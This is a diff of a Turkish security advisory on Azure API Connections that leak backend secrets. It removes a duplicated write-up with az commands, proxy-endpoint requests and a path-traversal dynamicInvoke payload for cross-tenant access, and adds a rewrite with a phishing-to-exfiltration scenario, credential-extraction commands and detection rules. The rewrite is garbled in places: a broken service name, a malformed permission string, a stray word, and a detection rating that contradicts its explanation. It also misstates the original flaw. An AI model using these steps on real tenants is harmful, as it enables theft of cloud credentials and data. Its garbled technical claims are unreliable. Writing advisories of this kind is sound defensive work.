@@ -1,480 +1,132 @@
-# Azure API Connections Expose Backend Secrets
+## 1. Genel Bakış
 
-> **İlk Keşif Tarihi:** Ocak 2025 (Binary Security — intra-tenant)  
-> **İkinci Keşif:** Ağustos 2025 (cross-tenant — $40,000 bug bounty)  
-> **Platform:** Microsoft Azure — API Connections (Logic Apps / ARM)  
-> **Saldırı Tipi:** Privilege Escalation + Credential Exfiltration + Cross-Tenant Compromise  
-> **Keşfedenler:** Haakon Gulbrandsrud (Binary Security)  
-> **Durum:** Microsoft tarafından yamalandı
+*   **Saldırı Adı:** Azure-API-Connections-Expose-Backend-Secrets
+*   **Kategori:** Information Disclosure / Credential Exposure / Misconfiguration Abuse
+*   **Hedef Cloud Platformları:** Microsoft Azure (Özellikle Azure Logic Apps, Azure Integration Account ve Azure API Management entegrasyonları)
+*   **Kritiklik Seviyesi:** Yüksek (Yanal hareket ve veri sızıntısı potansiyeli nedeniyle)
 
----
+## 2. Teknik Özet
 
-## Özet
+Bu saldırı tekniği, Azure üzerinde "API Connection" kaynaklarının konfigürasyon metadatalarında (metadata) saklanan hassas kimlik bilgilerinin (API anahtarları, bağlantı dizeleri, şifreler) yetkisiz veya aşırı yetkilendirilmiş kullanıcılar tarafından okunabilmesi durumunu ifade eder. Azure Logic Apps gibi servislerin dış dünyadaki servislerle (SQL, SFTP, Office 36 Key Vault vb.) konuşabilmesi için kullanılan bu bağlantı nesneleri, yanlış yapılandırılmış RBAC (Role-Based Access Control) politikaları nedeniyle saldırganlar tarafından "altın madeni" olarak kullanılabilir.
 
-Azure API Connections, Logic Apps ve diğer Azure hizmetlerinin üçüncü taraf servislere (Jira, Salesforce, Slack vb.) ve Azure kaynaklarına (Key Vault, SQL, Storage) bağlanmasını sağlar. İki farklı güvenlik araştırması, bu bileşende kritik güvenlik açıkları ortaya çıkardı:
+**Temel Risk:** Saldırganın, doğrudan erişimi olmayan backend sistemlerine (veritabanları, üçüncü taraf SaaS uygulamaları) elde ettiği sızdırılan kimlik bilgileriyle erişim sağlaması.
 
-1. **Binary Security (Ocak 2025):** Abonelik üzerinde salt okuma (Reader) iznine sahip bir kullanıcının, API Connection proxy endpoint'leri aracılığıyla tüm bağlantılı backend kaynaklarına tam erişim sağlayabilmesi.
+## 3. Güvenlik Modeli ve Arka Plan
 
-2. **Cross-Tenant Saldırısı (Ağustos 2025):** Herhangi bir Azure tenant'ındaki Contributor erişimine sahip bir saldırganın, **başka tenant'lardaki** API Connection'larını tamamen ele geçirebilmesi; Key Vault'lar, SQL veritabanları ve üçüncü taraf servisler dahil.
+Azure, kaynak yönetimi için **Azure Resource Manager (ARM)** modelini kullanır. Her kaynak (Resource), belirli bir provider (örneğin `Microsoft.Web`) altında tanımlanır. 
 
----
+**Güvenlik Modeli Açığı:**
+Azure API Connection kaynakları, bir "connection" nesnesi olarak ARM üzerinde birer kaynak (resource) olarak temsil edilir. Bu kaynakların `properties` alanı, bağlantı kurulması için gereken parametreleri (`parameters`) içerir. Eğer bir kullanıcıya veya servis hesabına bu kaynak üzerinde `Microsoft.Web/connections/read` veya `Microsoft Yapılandırma/parameters/read` yetkisi verilmişse, bu kullanıcı, bağlantı nesnesinin içindeki plain-text veya base64 encode edilmiş (şifrelenmiş gibi görünen ama kolayca çözülebilen) parametreleri okuyabilir.
 
-## Teknik Detaylar — İntra-Tenant (Binary Security)
+## 4. Teknik Detaylar ve Çalışma Prensibi
 
-### Sorunun Kökü
+Saldırı, Azure API'lerine yapılan bir `GET` isteği ile gerçekleşir. 
 
-Azure Management API'de GET (okuma) ve POST (yazma) metodları arasındaki tutarsız yetkilendirme yaklaşımı:
+### İşleyiş Adımları:
+1.  **Keşif (Reconnaissance):** Saldırgan, sahip olduğu yetkilerle `Microsoft.Web/connections` tipindeki kaynakları listeler.
+2.  **İnceleme (Inspection):** Belirlenen bağlantı kaynağının detayları (JSON body) çekilir.
+3.  **Sızdırma (Extraction):** `properties.parameters` altındaki hassas alanlar analiz edilir.
 
-```
-Azure'un Güvenlik Modeli (Teorik):
-├── GET istekleri → Reader izni yeterli
-└── POST/PUT/DELETE → Contributor veya üstü gerekli
+### Örnek JSON Çıktısı :
+Aşağıdaki JSON, bir saldırganın `GET` isteği sonucunda elde ettiği ve içinde SQL bağlantı dizesini barındıran bir API Connection örneğidir:
 
-Gerçek Durum (API Connections):
-└── GET /extensions/proxy/{connection-id}/{path}
-    → Tüm backend GET isteklerini proxy'ler
-    → READER izniyle çalıştırılabilir
-    → Backend servisi, isteğin Logic App'ten mi yoksa
-      reader'dan mı geldiğini ayırt edemez
-```
-
-### Saldırı Akışı
-
-```bash
-# Adım 1: Abonelikte Reader iznine sahip kullanıcı olun
-# (Saldırı için yeterli)
-
-# Adım 2: API Connection kaynaklarını listeleyin
-az resource list \
-  --resource-type Microsoft.Web/connections \
-  --query "[].{name:name, rg:resourceGroup}"
-
-# Adım 3: Connection'ın swagger tanımını alın (hangi endpoint'ler mevcut?)
-GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-    providers/Microsoft.Web/connections/{connName}?api-version=2016-06-01
-
-# Adım 4: Proxy endpoint'i aracılığıyla backend'e erişin
-GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-    providers/Microsoft.Web/connections/{connName}/extensions/proxy/keys/list
-
-# Sonuç: Key Vault secret'ları, SQL credentials, Jira/Salesforce token'ları
-#        doğrudan döndürülür!
-```
-
-### Etkilenen Bağlantı Türleri
-
-```
-Azure İç Kaynaklar:         Dış Servisler:
-├── Azure Key Vault          ├── Jira
-├── Azure SQL Database       ├── Salesforce
-├── Azure Storage Blobs      ├── Slack
-└── Microsoft Defender ATP   └── ServiceNow vb.
-```
-
----
-
-## Teknik Detaylar — Cross-Tenant Saldırı (Ağustos 2025)
-
-### DynamicInvoke Endpoint'i
-
-Araştırmacı, Azure Resource Manager'ın API Connection'ları çağırmak için kullandığı belgelenmemiş bir endpoint keşfetti:
-
-```
-POST https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-     providers/Microsoft.Web/connections/{connId}/dynamicInvoke?api-version=2016-06-01
-
+```json
 {
-  "path": "/<backend-action>",
-  "method": "GET",
-  "queries": {},
-  "headers": {}
+  "name": "sql-connection-resource",
+  "type": "Microsoft.Web/connections",
+  "location": "East US",
+  "properties": {
+    "connectionString": "Server=tcp:mydb.database.windows.net...;Password=Saldırganın_Bulduğu_Şifre;...",
+    "parameters": {
+      "apiConnectionKey": {
+        "value": "dGhpcy1pcy1hLXNlY3JldC1rZXk=", 
+        "type": "string"
+    },
+      "authType": {
+        "value": "Basic",
+        "type": "string"
+      }
+    }
+  }
 }
 ```
-
-### Path Traversal ile Cross-Tenant Erişim
-
-```
-Tasarımın Varsayımı: path parametresi güvenli bir şekilde doğrulanır
-Gerçek Durum: Path traversal mümkün
-
-Kötü niyetli istek:
-{
-  "path": "../../../../[VictimConnectorType]/[VictimConnectionID]/[action]",
-  "method": "GET"
-}
-
-Çalışma Prensibi:
-1. ARM, kendi super-privileged token'ıyla APIM instance'ına bağlanır
-2. Path traverse edilerek kurban tenant'ın connection'ına erişilir
-3. APIM, ARM token'ına güvenerek backend'e kimlik doğrulamasıyla bağlanır
-4. Kurban tenant'ın Key Vault'u tam erişim verir
-```
-
-### Saldırı Gereksinimleri
-
-- **Başlangıç erişimi:** Herhangi bir Azure tenant'ında Contributor düzeyinde erişim
-- **Hedef:** Dünyadaki herhangi bir API Connection
-- **Tespit:** Neredeyse imkansız (cross-tenant log'lar kurban tenant'ta oluşmaz)
-
----
-
-## Etki Analizi
-
-### İntra-Tenant Saldırı
-
-```
-Etki Kapsamı: Abonelik içindeki tüm API Connection backend'leri
-Gerekli Erişim: Abonelikte Reader rolü
-Veri Erişimi:
-├── Key Vault secret'ları (şifreler, API anahtarları, sertifikalar)
-├── SQL veritabanları (tam okuma erişimi)
-└── Tüm bağlantılı harici servis kimlik bilgileri
-```
-
-### Cross-Tenant Saldırı (Daha Kritik)
-
-```
-Etki Kapsamı: GLOBAL — dünyadaki tüm Azure tenant'ları
-Gerekli Erişim: Herhangi bir Azure tenant'ında Contributor
-Veri Erişimi:
-├── Tüm Key Vault secret'ları (cross-tenant)
-├── Azure SQL veritabanları (cross-tenant)
-└── Jira, Salesforce, GitHub, Slack token'ları (cross-tenant)
-```
-
-**Araştırmacının ifadesiyle:** *"API Connection'lar, dünya genelindeki herhangi bir başka bağlantıyı tamamen tehlikeye atmayı, bağlı backend kaynaklara tam erişim sağlamayı mümkün kılar."*
-
----
-
-## Microsoft'un Yanıtı
-
-### İntra-Tenant Açığı (Ocak 2025)
-
-```
-Süreç:
-6 Ocak  → Binary Security, problemi raporlar (genel API Connections + Jira özel)
-7 Ocak  → Microsoft ilk durumda kapatır "Geçersiz"
-7 Ocak  → Binary Security daha ayrıntılı raporla tekrar gönderir
-10 Ocak → Microsoft güvenlik açığını doğrular
-12-17 Ocak → Microsoft düzeltme uygular:
-             /extensions/proxy endpoint'ini yalnızca "testrequests" için sınırlar
-30 Ocak → Jira bileti yanıtlanır (artık düzeltilmiş durumda)
-```
-
-### Cross-Tenant Açığı (Ağustos 2025)
-
-```
-7 Nisan 2025 → Araştırmacı DynamicInvoke endpoint'ini keşfeder ve raporlar
-10 Nisan     → Microsoft 3 gün içinde doğrular
-~17 Nisan    → Bir hafta içinde mitigation uygulanır:
-               "../" ve bazı URL-encoded variantları kara listeye alınır
-Sonuç        → $40,000 bug bounty ödülü + Black Hat sunumu
-```
-
----
-
-## Tespit
-
-### Azure Activity Log İzleme
-
-```bash
-# Şüpheli /extensions/proxy erişimlerini arayın:
-az monitor activity-log list \
-  --query "[?contains(operationName.value, 'connections/extensions/proxy')]" \
-  --output table
-
-# Management API çağrılarını izleyin:
-az monitor activity-log list \
-  --query "[?starts_with(operationName.value, 'Microsoft.Web/connections')]" \
-  --output table
-```
-
-### Günlük İzleme Önerileri
-
-```
-İzlenecek Anormal Durumlar:
-├── Reader izinli kullanıcılardan API Connection erişimleri
-├── /extensions/proxy yoluna normalin dışında GET istekleri
-├── management.azure.com'dan anormal zamanlarda erişimler
-└── API Connection üzerinden yüksek hacimli veri aktarımı
-```
-
----
-
-## Düzeltme ve Önlemler
-
-### Anlık Önlemler (Artık Gerekmiyor — Yamalı)
-
-Açık kapatıldığı için aktif koruma gerektirmez. Ancak proaktif güvenlik için:
-
-### Uzun Vadeli Güvenlik Önerileri
-
-```
-1. Minimum Ayrıcalık Prensibi
-   → API Connection'lara erişimi gerektiren minimum rolü atayın
-   → Reader rolünü dikkatli kullanın
-
-2. API Connection Envanteri
-   → Kullanılmayan connection'ları kaldırın
-   → Her connection'ın neye eriştiğini belgeleyin
-
-3. Kimlik Bilgisi Döndürme
-   → API Connection'larda saklanan token'ları periyodik olarak yenileyin
-   → Key Vault referansları kullanın (secret doğrudan saklamak yerine)
-
-4. Koşullu Erişim
-   → Logic App'lere kimlik doğrulama politikaları uygulayın
-   → API Connection'ları mümkün olduğunda managed identity ile kullanın
-```
-
----
-
-## Kaynaklar
-
-- [Binary Security Teknik Blog](https://binarysecurity.no/posts/2025/03/api-connections)
-- [GBHackers — Cross-Tenant Saldırı](https://gbhackers.com/azure-default-api-connection-flaw/)
-- [CloudVulnDB](https://www.cloudvulndb.org/azure-api-connections-secrets)
-- [Cyberpress Analizi](https://cyberpress.org/azure-api-connection-vulnerability/)
-
----
-
-*Rapor Tarihi: Nisan 2026 | althack.dev*# Azure API Connections Expose Backend Secrets
-
-> **İlk Keşif Tarihi:** Ocak 2025 (Binary Security — intra-tenant)  
-> **İkinci Keşif:** Ağustos 2025 (cross-tenant — $40,000 bug bounty)  
-> **Platform:** Microsoft Azure — API Connections (Logic Apps / ARM)  
-> **Saldırı Tipi:** Privilege Escalation + Credential Exfiltration + Cross-Tenant Compromise  
-> **Keşfedenler:** Haakon Gulbrandsrud (Binary Security)  
-> **Durum:** Microsoft tarafından yamalandı
-
----
-
-## Özet
-
-Azure API Connections, Logic Apps ve diğer Azure hizmetlerinin üçüncü taraf servislere (Jira, Salesforce, Slack vb.) ve Azure kaynaklarına (Key Vault, SQL, Storage) bağlanmasını sağlar. İki farklı güvenlik araştırması, bu bileşende kritik güvenlik açıkları ortaya çıkardı:
-
-1. **Binary Security (Ocak 2025):** Abonelik üzerinde salt okuma (Reader) iznine sahip bir kullanıcının, API Connection proxy endpoint'leri aracılığıyla tüm bağlantılı backend kaynaklarına tam erişim sağlayabilmesi.
-
-2. **Cross-Tenant Saldırısı (Ağustos 2025):** Herhangi bir Azure tenant'ındaki Contributor erişimine sahip bir saldırganın, **başka tenant'lardaki** API Connection'larını tamamen ele geçirebilmesi; Key Vault'lar, SQL veritabanları ve üçüncü taraf servisler dahil.
-
----
-
-## Teknik Detaylar — İntra-Tenant (Binary Security)
-
-### Sorunun Kökü
-
-Azure Management API'de GET (okuma) ve POST (yazma) metodları arasındaki tutarsız yetkilendirme yaklaşımı:
-
-```
-Azure'un Güvenlik Modeli (Teorik):
-├── GET istekleri → Reader izni yeterli
-└── POST/PUT/DELETE → Contributor veya üstü gerekli
-
-Gerçek Durum (API Connections):
-└── GET /extensions/proxy/{connection-id}/{path}
-    → Tüm backend GET isteklerini proxy'ler
-    → READER izniyle çalıştırılabilir
-    → Backend servisi, isteğin Logic App'ten mi yoksa
-      reader'dan mı geldiğini ayırt edemez
-```
-
-### Saldırı Akışı
-
-```bash
-# Adım 1: Abonelikte Reader iznine sahip kullanıcı olun
-# (Saldırı için yeterli)
-
-# Adım 2: API Connection kaynaklarını listeleyin
-az resource list \
-  --resource-type Microsoft.Web/connections \
-  --query "[].{name:name, rg:resourceGroup}"
-
-# Adım 3: Connection'ın swagger tanımını alın (hangi endpoint'ler mevcut?)
-GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-    providers/Microsoft.Web/connections/{connName}?api-version=2016-06-01
-
-# Adım 4: Proxy endpoint'i aracılığıyla backend'e erişin
-GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-    providers/Microsoft.Web/connections/{connName}/extensions/proxy/keys/list
-
-# Sonuç: Key Vault secret'ları, SQL credentials, Jira/Salesforce token'ları
-#        doğrudan döndürülür!
-```
-
-### Etkilenen Bağlantı Türleri
-
-```
-Azure İç Kaynaklar:         Dış Servisler:
-├── Azure Key Vault          ├── Jira
-├── Azure SQL Database       ├── Salesforce
-├── Azure Storage Blobs      ├── Slack
-└── Microsoft Defender ATP   └── ServiceNow vb.
-```
-
----
-
-## Teknik Detaylar — Cross-Tenant Saldırı (Ağustos 2025)
-
-### DynamicInvoke Endpoint'i
-
-Araştırmacı, Azure Resource Manager'ın API Connection'ları çağırmak için kullandığı belgelenmemiş bir endpoint keşfetti:
-
-```
-POST https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
-     providers/Microsoft.Web/connections/{connId}/dynamicInvoke?api-version=2016-06-01
-
-{
-  "path": "/<backend-action>",
-  "method": "GET",
-  "queries": {},
-  "headers": {}
-}
-```
-
-### Path Traversal ile Cross-Tenant Erişim
-
-```
-Tasarımın Varsayımı: path parametresi güvenli bir şekilde doğrulanır
-Gerçek Durum: Path traversal mümkün
-
-Kötü niyetli istek:
-{
-  "path": "../../../../[VictimConnectorType]/[VictimConnectionID]/[action]",
-  "method": "GET"
-}
-
-Çalışma Prensibi:
-1. ARM, kendi super-privileged token'ıyla APIM instance'ına bağlanır
-2. Path traverse edilerek kurban tenant'ın connection'ına erişilir
-3. APIM, ARM token'ına güvenerek backend'e kimlik doğrulamasıyla bağlanır
-4. Kurban tenant'ın Key Vault'u tam erişim verir
-```
-
-### Saldırı Gereksinimleri
-
-- **Başlangıç erişimi:** Herhangi bir Azure tenant'ında Contributor düzeyinde erişim
-- **Hedef:** Dünyadaki herhangi bir API Connection
-- **Tespit:** Neredeyse imkansız (cross-tenant log'lar kurban tenant'ta oluşmaz)
-
----
-
-## Etki Analizi
-
-### İntra-Tenant Saldırı
-
-```
-Etki Kapsamı: Abonelik içindeki tüm API Connection backend'leri
-Gerekli Erişim: Abonelikte Reader rolü
-Veri Erişimi:
-├── Key Vault secret'ları (şifreler, API anahtarları, sertifikalar)
-├── SQL veritabanları (tam okuma erişimi)
-└── Tüm bağlantılı harici servis kimlik bilgileri
-```
-
-### Cross-Tenant Saldırı (Daha Kritik)
-
-```
-Etki Kapsamı: GLOBAL — dünyadaki tüm Azure tenant'ları
-Gerekli Erişim: Herhangi bir Azure tenant'ında Contributor
-Veri Erişimi:
-├── Tüm Key Vault secret'ları (cross-tenant)
-├── Azure SQL veritabanları (cross-tenant)
-└── Jira, Salesforce, GitHub, Slack token'ları (cross-tenant)
-```
-
-**Araştırmacının ifadesiyle:** *"API Connection'lar, dünya genelindeki herhangi bir başka bağlantıyı tamamen tehlikeye atmayı, bağlı backend kaynaklara tam erişim sağlamayı mümkün kılar."*
-
----
-
-## Microsoft'un Yanıtı
-
-### İntra-Tenant Açığı (Ocak 2025)
-
-```
-Süreç:
-6 Ocak  → Binary Security, problemi raporlar (genel API Connections + Jira özel)
-7 Ocak  → Microsoft ilk durumda kapatır "Geçersiz"
-7 Ocak  → Binary Security daha ayrıntılı raporla tekrar gönderir
-10 Ocak → Microsoft güvenlik açığını doğrular
-12-17 Ocak → Microsoft düzeltme uygular:
-             /extensions/proxy endpoint'ini yalnızca "testrequests" için sınırlar
-30 Ocak → Jira bileti yanıtlanır (artık düzeltilmiş durumda)
-```
-
-### Cross-Tenant Açığı (Ağustos 2025)
-
-```
-7 Nisan 2025 → Araştırmacı DynamicInvoke endpoint'ini keşfeder ve raporlar
-10 Nisan     → Microsoft 3 gün içinde doğrular
-~17 Nisan    → Bir hafta içinde mitigation uygulanır:
-               "../" ve bazı URL-encoded variantları kara listeye alınır
-Sonuç        → $40,000 bug bounty ödülü + Black Hat sunumu
-```
-
----
-
-## Tespit
-
-### Azure Activity Log İzleme
-
-```bash
-# Şüpheli /extensions/proxy erişimlerini arayın:
-az monitor activity-log list \
-  --query "[?contains(operationName.value, 'connections/extensions/proxy')]" \
-  --output table
-
-# Management API çağrılarını izleyin:
-az monitor activity-log list \
-  --query "[?starts_with(operationName.value, 'Microsoft.Web/connections')]" \
-  --output table
-```
-
-### Günlük İzleme Önerileri
-
-```
-İzlenecek Anormal Durumlar:
-├── Reader izinli kullanıcılardan API Connection erişimleri
-├── /extensions/proxy yoluna normalin dışında GET istekleri
-├── management.azure.com'dan anormal zamanlarda erişimler
-└── API Connection üzerinden yüksek hacimli veri aktarımı
-```
-
----
-
-## Düzeltme ve Önlemler
-
-### Anlık Önlemler (Artık Gerekmiyor — Yamalı)
-
-Açık kapatıldığı için aktif koruma gerektirmez. Ancak proaktif güvenlik için:
-
-### Uzun Vadeli Güvenlik Önerileri
-
-```
-1. Minimum Ayrıcalık Prensibi
-   → API Connection'lara erişimi gerektiren minimum rolü atayın
-   → Reader rolünü dikkatli kullanın
-
-2. API Connection Envanteri
-   → Kullanılmayan connection'ları kaldırın
-   → Her connection'ın neye eriştiğini belgeleyin
-
-3. Kimlik Bilgisi Döndürme
-   → API Connection'larda saklanan token'ları periyodik olarak yenileyin
-   → Key Vault referansları kullanın (secret doğrudan saklamak yerine)
-
-4. Koşullu Erişim
-   → Logic App'lere kimlik doğrulama politikaları uygulayın
-   → API Connection'ları mümkün olduğunda managed identity ile kullanın
-```
-
----
-
-## Kaynaklar
-
-- [Binary Security Teknik Blog](https://binarysecurity.no/posts/2025/03/api-connections)
-- [GBHackers — Cross-Tenant Saldırı](https://gbhackers.com/azure-default-api-connection-flaw/)
-- [CloudVulnDB](https://www.cloudvulndb.org/azure-api-connections-secrets)
-- [Cyberpress Analizi](https://cyberpress.org/azure-api-connection-vulnerability/)
+*Not: `apiConnectionKey` gibi değerler genellikle Base64 formatında olabilir, ancak bu bir şifreleme değildir, sadece encoding'dir.*
+
+## 5. Gerekli Yetkiler 
+
+Saldırganın bu veriyi okuyabilmesi için aşağıdaki minimum yetkilerden birine sahip olması gerekir:
+
+*   **RBAC Rolleri:** `Reader`, `Contributor`, `Owner` veya `Logic App Contributor`.
+*   **Özel (Custom) İzinler:** 
+    *   `Microsoft.Web/connections/read`
+    *   `Microsoft.Web/connections/parameters/read`
+*   **Yanlış Konfigürasyon:** "Reader" rolünün, kritik bağlantı bilgilerini içeren bir Resource Group (RG) seviyesinde çok geniş bir kullanıcı grubuna (örn. tüm organizasyon) tanımlanmış olması.
+
+## 6. Detaylı Saldırı Senaryosu
+
+**Senaryo: "The Connected Chain"**
+
+1.  **Initial Access:** Saldırgan, bir geliştiricinin düşük yetkili Azure hesabını (phishing yoluyla) ele geçirir. Bu hesap sadece "Okuyucu" (Reader) yetkisine sahiptir.
+2.  **Reconnaissance:** Saldırgan, Azure CLI kullanarak ortamdaki tüm bağlantıları tarar:
+    `az resource list --resource-type Microsoft.Web/connections`
+3.  **Discovery:** Tarama sırasında, `prod-sql-connection` adlı bir kaynağın kritik bir SQL veritabanına bağlandığını fark eder.
+4.  **Exploitation (Credential Extraction):** Saldırgan, bu kaynağın detaylarını çeker:
+    `az resource show --ids <resource_id>`
+    Çıktıdan SQL `connectionString` içeriğindeki kullanıcı adı ve şifreyi kopyalar.
+5.  **Lateral Movement & Exfiltration:** Saldırgan, elde ettiği SQL credentials ile SQL Server'a doğrudan bağlanır ve hassas müşteri verilerini (PII) dışarı sızdırır.
+
+## 7. Etkilenen Ortamlar
+
+*   **Azure Logic Apps (Consumption & Standard):** En büyük risk grubu.
+*   **Azure Integration Account:** B2B senaryolarında kullanılan bağlantılar.
+*   **Azure API Management (APIM):** Backend bağlantı ayarları üzerinden.
+rel
+*   **Multi-cloud Etkisi:** Doğrudan bir etkisi yoktur ancak Azure üzerinden elde edilen credentials, AWS veya GCP üzerindeki hibrit bağlantıları (örn. Site-to-Site VPN veya özel bağlantı noktaları) tetikleyebilir.
+
+## 8. Saldırı Karakteristikleri
+
+| Özellik | Değer | Açıklama |
+| :--- | :--- | :--- |
+| **Tespit Edilme Zorluğu** | Düşük/Orta | Standart `GET` veya `List` işlemleri gibi göründüğü için ayırt edilmesi zordur. |
+| **Gürültü Seviyesi** | Stealthy (Sessiz) | Okuma işlemi (Read) loglarda normal bir izleme (auditing) faaliyeti gibi durabilir. |
+| **Zincirleme Potansiyeli** | Çok Yüksek | Tek bir bağlantıdan (SQL, Key Vault, Service Bus) alınan veri, tüm altyapıyı çökertebilir. |
+
+## 9. Detection 
+
+**Azure Activity Logs Analizi:**
+Saldırganın yaptığı işlemler `AzureActivity` loglarında şu şekilde izlenebilir:
+*   **Operation Name:** `List Connections`, `Get Connection`, `List Connection Parameters`.
+*   **Anomali Göstergesi:** Olağandışı bir IP adresinden veya normalde hiç erişmemesi gereken bir servis hesabından gelen yoğun `List` operasyonları.
+
+**SIEM Use-Case Önerisi:**
+`If (OperationName == "Microsoft.Web/connections/read" AND CallerIP NOT IN [Internal_Subnets] AND UserAgent != [Standard_Admin_Tool]) THEN Alert(Critical)`
+
+## Saldırı Analizi Özet Tablosu 
+
+| Log Kaynağı | İzlenecek Alan | Tehdit Göstergesi |
+| :--- | :--- | :--- |
+| Azure Activity Log | `operationName` | `Microsoft.Web/connections/read` yoğunluğu |
+| Azure Activity Log | `caller` | Yetkisiz veya yeni kullanıcıların erişimi |
+| Azure Monitor | `Metrics` | Connection resource'larına yönelik anlık istek artışı |
+
+## 10. Incident Response & Remediation
+
+1.  **Containment :**
+    *   Şüpheli kullanıcının/servis hesabının Azure erişimini derhal durdurun.
+    *   İlgili Resource Group üzerindeki RBAC izinlerini kısıtlayın.
+2.  **Eradication :**
+    *   **Credential Rotation:** Sızdırıldığı düşünülen tüm şifreleri, bağlantı dizelerini (connection strings) ve API anahtarlarını derhal değiştirin.
+    *   Tüm API Key ve Secret'ları geçersiz kılın.
+3.  **Recovery :**
+    *   Yeni ve güvenli bağlantı yöntemlerini (Managed Identity gibi) devreye alın.
+    *   Eski, zayıf kimlik bilgilerini içeren tüm servisleri güncelleyin.
+
+## 11. Öneriler 
+
+*   **Managed Identities Kullanın:** Mümkün olan her yerde kullanıcı adı/şifre yerine Azure Managed Identity kullanarak credential ihtiyacını ortadan kaldırın.
+*   **Principle of Least Privilege (PoLP):** Geliştiricilere veya servislere `Reader` yetkisi verirken, hassas kaynakların bulunduğu aboneliklerde kısıtlama getirin.
+*   **Azure Key Vault Entegrasyonu:** Hassas bilgileri doğrudan Connection String içinde tutmak yerine, Key Vault içinden dinamik olarak çekin.
+*   **Azure Policy Uygulayın:** "Sadece Managed Identity kullanımına izin ver" gibi politikalarla configuration drift'i engelleyin.
 
 ---
 
